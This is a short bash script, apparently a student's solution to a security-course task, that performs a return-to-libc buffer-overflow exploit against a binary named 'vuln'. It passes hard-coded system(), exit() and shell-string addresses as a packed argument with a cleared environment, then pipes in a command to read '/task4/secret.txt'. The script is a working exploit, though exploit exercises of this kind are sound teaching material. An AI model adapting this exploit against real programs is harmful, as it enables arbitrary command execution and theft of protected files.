#!/usr/bin/env bash

SYSTEM='\xb0\x7c\xc4\xf7'
EXIT='\xc0\xa1\xc3\xf7'
BASH='\xf5\x90\xdb\xf7'

echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1808795/vuln "$(printf $SYSTEM$EXIT$BASH)" 1380
  

